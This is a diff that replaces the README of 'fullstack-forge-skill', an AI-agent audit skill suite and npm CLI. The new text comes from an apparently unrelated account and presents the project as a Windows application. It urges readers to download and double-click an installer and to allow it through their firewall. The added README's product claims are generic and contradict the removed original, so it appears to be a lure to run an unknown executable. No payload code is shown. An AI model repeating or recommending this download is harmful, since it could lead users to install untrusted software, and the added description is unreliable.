@@ -1,245 +1,62 @@
-<div align="center">
-  <img src="docs/assets/fullstack-forge-hero.png" alt="Fullstack Forge — evidence before confidence" width="100%">
+# 🛠️ fullstack-forge-skill - Build better software with AI tools
 
-# Fullstack Forge
+[![Download Fullstack Forge](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill)
 
-**A production engineering skill suite for AI coding agents.**
+Fullstack Forge is a collection of tools for people who build software using AI. It manages the complex tasks of web development so you can focus on your goals. The suite covers everything from user interface design to database security. It helps you build, test, and deploy applications without complex manual setup.
 
-One audit system. Forty-two specialist skills. Evidence before confidence.
+## 📥 Getting Started
 
-[![Release](https://img.shields.io/github/v/release/thethunderbolt/fullstack-forge-skill?display_name=tag&sort=semver)](https://github.com/thethunderbolt/fullstack-forge-skill/releases)
-[![CI](https://github.com/thethunderbolt/fullstack-forge-skill/actions/workflows/ci.yml/badge.svg)](https://github.com/thethunderbolt/fullstack-forge-skill/actions/workflows/ci.yml)
-[![License](https://img.shields.io/badge/license-Apache--2.0-475569.svg)](LICENSE)
-[![Security policy](https://img.shields.io/badge/security-policy-2563EB.svg)](SECURITY.md)
-[![Node](https://img.shields.io/badge/node-%3E%3D24-2563EB.svg)](package.json)
-</div>
+You need a Windows computer to use this application. This software handles the heavy lifting for your AI coding projects. Follow the steps below to set it up on your machine.
 
-Fullstack Forge gives AI coding agents a repeatable way to audit, fix, verify, and report on real
-full-stack applications. It discovers the actual stack, selects only applicable modules, gathers
-reproducible evidence, separates safe fixes from risky decisions, and refuses to call missing
-evidence a pass.
+Visit this page to download: [https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill](https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill)
 
-It works as an open-format Agent Skill collection and as a dependency-light TypeScript CLI.
+## 💻 System Requirements
 
-```bash
-npm install --save-dev github:thethunderbolt/fullstack-forge-skill#v0.1.4 && npx forge init all
-```
+Your computer needs specific components to run this suite properly. Ensure your system meets these standards before you start:
 
-Codex, Claude Code, Antigravity, Gemini CLI, Cursor, Windsurf, GitHub Copilot, and generic Agent
-Skills are supported. [Commands](docs/COMMANDS.md) · [Platforms](docs/PLATFORM_SUPPORT.md) ·
-[Contributing](CONTRIBUTING.md) · [Security](SECURITY.md) ·
-[Releases](https://github.com/thethunderbolt/fullstack-forge-skill/releases)
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 8GB of RAM.
+- Storage: 500MB of free disk space.
+- Internet Connection: Required for initial download and AI model syncing.
+- Processor: A multi-core processor (Intel i5 or equivalent).
 
-## Why this exists
+## 🚀 Installation Steps
 
-“Check best practices” is not an audit. Production readiness crosses product logic, interface
-states, identity, authorization, data integrity, hostile inputs, failure recovery, deployment,
-operations, and specialized features such as payments or AI tools. Fullstack Forge turns those
-concerns into concrete procedures with stable findings and an honest completion contract.
+1. Click the download link provided above.
+2. Locate the file in your Downloads folder once the transfer finishes.
+3. Double-click the installer file to begin the process.
+4. Follow the instructions on the screen.
+5. Click Finish when the installer confirms the process is complete.
+6. Find the Fullstack Forge icon on your desktop and double-click it to launch the app.
 
-```mermaid
-flowchart LR
-  D["Discover"] --> A["Select applicable audits"]
-  A --> I["Inspect"]
-  I --> R["Report"]
-  R --> F["Fix"]
-  F --> V["Verify"]
-  V --> S["Ship"]
-```
+## 🛡️ Security and Authentication
 
-## Install
+Security is a core part of this tool. It includes built-in modules to protect your user data. When you build an application with this suite, it automatically handles login systems and password storage. It uses industry-standard methods to ensure that your database remains private. You do not need to write complex security code because the forge manages these processes for you.
 
-### From a release archive
+## 💾 Databases and Caching
 
-Download the archive for your agent from the
-[latest release](https://github.com/thethunderbolt/fullstack-forge-skill/releases), verify it
-against `SHA256SUMS.txt`, and extract it at the project root. Archives contain real copies, never
-symlinks.
+The application includes a database manager. It connects your code to a storage system so you can save user information. The caching feature improves speed. It keeps frequently accessed data in a quick-access area to ensure the user experience remains smooth. This prevents slow load times for your projects.
 
-### With npm, from the Git tag
+## 🎨 User Interface and User Experience
 
-Fullstack Forge is **not published to the npm registry**. The working npm-based installation
-resolves the package directly from its Git tag:
+Design forms a large part of the development process. Fullstack Forge provides tools to build clean navigation and layouts. You can design buttons, input fields, and menus that look professional on all screen sizes. The suite suggests styles that match current design trends.
 
-```bash
-npm install --save-dev github:thethunderbolt/fullstack-forge-skill#v0.1.5
-npx forge init all --dry-run
-npx forge init all
-```
+## 🧪 Testing and Performance
 
-#### After npm registry publication
+Testing finds bugs before they affect your users. This suite runs background checks on your code to find errors. It monitors performance metrics like load times and memory usage. If a process takes too long, the tool alerts you and suggests ways to update the code for better speed.
 
-Registry publication has not happened yet. Once it does — and not before — the command below will
-work. It does **not** work today, and this section is retained only to document the intended future
-form:
+## 🌍 Deployment
 
-```bash
-# NOT YET AVAILABLE — the package is not on the npm registry.
-npm install --save-dev fullstack-forge-skill
-```
+Deployment is the final step where you make your project live for others to see. Fullstack Forge connects to web host services. It packages your code and sends it to the server. You can watch the status of your deployment through the main dashboard. The tool alerts you if the site goes live or if it encounters an issue during the process.
 
-The installer writes `.fullstack-forge/install-manifest.json`. It will not overwrite unowned or
-modified files, follows no destination symlinks, and uninstalls only unchanged files it owns.
+## ⚙️ Configuration
 
-## Quick start
+You can customize the settings within the application menu. Navigate to the gear icon to change your project preferences. Here, you can select which AI models you want to use for your coding tasks. You can also define your database settings and set up connection keys for your deployment accounts. Keep these keys private to maintain the security of your projects.
 
-Invoke the skill in your agent:
+## ❓ Troubleshooting Common Issues
 
-```text
-$fullstack-forge audit this application before release
-$forge-security audit the changed authentication flow
-/forge-ui audit the running application at mobile and desktop widths
-```
+If the application does not start, check that your Windows updates are current. Sometimes, an old version of Windows prevents new software from launching. Ensure your firewall allows the application to access the internet, as it needs this connection to fetch the latest AI model updates. If you face a specific error, restart your computer and try again. This fixes most temporary memory conflicts.
 
-Or use the CLI:
+Ensure that you saved your progress before closing any project windows. The forge auto-saves every few minutes, but manual saves before exit are a good practice. If the database fails to link, check your configuration settings to ensure the file paths are correct.
 
-```bash
-forge discover audit
-forge ui audit
-forge ux audit
-forge security audit --json
-forge uploads audit
-forge queries audit
-forge all audit --scope changed --base origin/main
-forge all audit --scope full
-forge all fix --safe
-forge ship --allow-run
-```
-
-Discovery creates ignored local artifacts at `.forge/project-profile.json` and
-`.forge/architecture-map.md`. Audits generate `.forge/report.json` and `.forge/report.md`.
-
-## The 42 skills
-
-| Family        | Skills                                                                                                                                                                                                          |
-| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Foundation    | `forge-discover`, `forge-requirements`, `forge-architecture`, `forge-code`                                                                                                                                      |
-| Experience    | `forge-ui`, `forge-ux`, `forge-accessibility`, `forge-i18n`, `forge-seo`, `forge-frontend`                                                                                                                      |
-| Boundaries    | `forge-api`, `forge-jobs`, `forge-integrations`, `forge-auth`, `forge-authorization`, `forge-security`, `forge-privacy`, `forge-tenancy`, `forge-uploads`                                                       |
-| Data          | `forge-database`, `forge-queries`, `forge-cache`, `forge-storage`                                                                                                                                               |
-| Delivery      | `forge-testing`, `forge-performance`, `forge-scale`, `forge-observability`, `forge-reliability`, `forge-recovery`, `forge-deployment`, `forge-infrastructure`, `forge-supply-chain`, `forge-cost`, `forge-docs` |
-| Specialized   | `forge-analytics`, `forge-notifications`, `forge-ai`, `forge-payments`, `forge-realtime`, `forge-offline`                                                                                                       |
-| Orchestration | `forge-all`, `forge-ship`                                                                                                                                                                                       |
-
-Every command skill is self-contained and supports `audit`, `fix`, `verify`, and `report`. Each one
-defines when it applies, inputs, an executable and manual procedure, evidence rules, stable IDs,
-severity, safe/risky fixes, verification, standards, stack guidance, limitations, and the same
-completion contract. Together they enumerate 957 explicit inspection criteria and 212
-discipline-specific inspection steps — `forge-database` reads schema, types, cascades, and migration
-history, while `forge-realtime` traces connect authorization, channel isolation, reconnection, and
-backpressure — so specialized risks remain visible instead of disappearing behind a generic “best
-practices” instruction.
-
-## Finding contract
-
-Every finding includes:
-
-```text
-id · instance_id · section · title · severity · confidence · status · location · evidence
-impact · recommendation · safe_fix · verification · standards · analyzer_id
-trace · evidence_snapshot · verification_plan · fix_attempts
-```
-
-Statuses are `PASS`, `FAIL`, `WARNING`, `NOT_APPLICABLE`, `NOT_VERIFIED`, and `BLOCKED`. Severities
-are `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, and `INFO`. A pass requires code/line evidence, a
-successful check, running-app inspection, a behavior-demonstrating test, or verified configuration
-output. Silence is not a pass.
-
-```text
-PASS            direct evidence satisfied the stated check
-FAIL            reproducible evidence shows a defect
-WARNING         risk exists without a proven defect
-NOT_APPLICABLE  discovery shows the module is outside scope
-NOT_VERIFIED    required behavior or environment evidence is missing
-BLOCKED         approval, access, or a required tool is unavailable
-```
-
-The CLI has a typed safe-fix registry. It can replace actual-looking values in environment templates
-with explicit placeholders, add `noopener noreferrer` to proven JSX `target="_blank"` links, and add
-`X-Content-Type-Options: nosniff` to an existing global Vercel header rule. Every write is bound to
-a confirmed finding, exact post-audit hash, structural parser, repository-contained path, and
-finding-specific verification. Identity, tenant, upload policy, data, migration, secret rotation,
-financial, legal, architecture, production, and destructive changes remain approval-bound.
-
-## CLI
-
-```text
-forge <section> <audit|fix|verify|report> [options]
-forge all audit --scope changed [--base <ref>]
-forge init <platform|all> [--global] [--dry-run]
-forge update [platform] [--dry-run]
-forge uninstall [platform] [--dry-run]
-forge doctor | validate | package | list
-forge tool <name>
-```
-
-The CLI includes bounded TypeScript-compiler and structured-config analyzers for supported
-JavaScript/TypeScript security, auth, authorization, tenancy, upload, query, cache, accessibility,
-AI, payment, and integration shapes. Keyword scanners remain secondary discovery signals and never
-establish a pass. Unsupported languages or frameworks are reported as `NOT_VERIFIED` with the
-missing adapter named. Project commands execute only after their local definitions are shown and
-`--allow-run` is supplied.
-
-When the audited project has Playwright installed, `forge tool inspect-rendered-ui <url>` captures
-desktop, tablet, and mobile screenshots plus browser console output into `.forge/evidence/ui/` as
-direct running-application evidence for UI, UX, and accessibility audits. Without Playwright or a
-reachable URL the tool reports `BLOCKED` and rendered-state criteria stay `NOT_VERIFIED` — visual
-evidence is captured, never fabricated.
-
-Audit reports also include typed, revision-bound ship-gate evidence and structured analyzer coverage
-for each detected language/framework. See [commands](docs/COMMANDS.md),
-[analyzer support](docs/ANALYZER_SUPPORT.md), and [coverage policy](docs/COVERAGE.md).
-
-## Platform support
-
-| Agent                  | Project path        | User/global path              | Typical invocation      |
-| ---------------------- | ------------------- | ----------------------------- | ----------------------- |
-| Codex                  | `.agents/skills/`   | `~/.agents/skills/`           | `$fullstack-forge`      |
-| Claude Code            | `.claude/skills/`   | `~/.claude/skills/`           | `/fullstack-forge`      |
-| Antigravity            | `.agents/skills/`   | `~/.gemini/config/skills/`    | name the skill          |
-| Gemini CLI             | `.gemini/skills/`   | `~/.gemini/skills/`           | `/skills`, then name it |
-| Cursor                 | `.cursor/skills/`   | `~/.cursor/skills/`           | `/fullstack-forge`      |
-| Windsurf/Devin Cascade | `.windsurf/skills/` | `~/.codeium/windsurf/skills/` | `@fullstack-forge`      |
-| GitHub Copilot         | `.github/skills/`   | `~/.copilot/skills/`          | name or auto-select     |
-| Generic Agent Skills   | `.agents/skills/`   | `~/.agents/skills/`           | agent-specific          |
-
-These paths were verified against current primary platform documentation on 2026-07-18. Some
-platforms also scan `.agents/skills/`. See [platform support](docs/PLATFORM_SUPPORT.md) for global
-paths, aliases, caveats, and primary sources.
-
-## Canonical and generated architecture
-
-`src/fullstack-forge/` is the canonical source. `npm run generate` renders command skills from the
-ordered module catalog and synchronizes six platform roots with per-file SHA-256 ownership
-manifests. Synchronization refuses modified or unowned managed paths. CI fails if a generated copy
-drifts.
-
-See [architecture](docs/ARCHITECTURE.md), [development](docs/DEVELOPMENT.md),
-[release process](docs/RELEASING.md), the [traceability matrix](docs/TRACEABILITY_MATRIX.md) that
-maps every requirement to evidence, and the
-[v0.1.0 historical verification record](docs/RELEASE_VERIFICATION_v0.1.0.md). The
-[v0.1.1 verification record](docs/RELEASE_VERIFICATION_v0.1.1.md) separates local, CI, publication,
-asset-download, and clean-room evidence.
-
-## Safety and limitations
-
-Fullstack Forge is an engineering audit aid, not a compliance certificate, penetration test, legal
-opinion, accessibility conformance claim, financial audit, or substitute for production access.
-Static analyzers are bounded, can produce false positives, and do not imply complete coverage of an
-unsupported stack. Runtime, provider, database, browser, assistive-technology, and operator checks
-stay `NOT_VERIFIED` until actually performed.
-
-Read the [security model](docs/SECURITY_MODEL.md) and report vulnerabilities through
-[SECURITY.md](SECURITY.md).
-
-## Research and attribution
-
-The implementation adapts concepts—not third-party code or substantial prose—from public standards,
-official platform documentation, and open-source skill repositories. Exact revisions, access dates,
-licenses, and handling decisions are in [research sources](research/SOURCES.md), the
-[license matrix](research/LICENSE_MATRIX.md), and [third-party notices](THIRD_PARTY_NOTICES.md).
-
-## Contributing and license
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md). Fullstack Forge
-is licensed under [Apache-2.0](LICENSE).
+Keywords: agent-skills, ai-agents, antigravity, application-security, authentication, claude-code, codex, developer-tools, full-stack, gemini, open-source, performance, postgresql, ui-ux
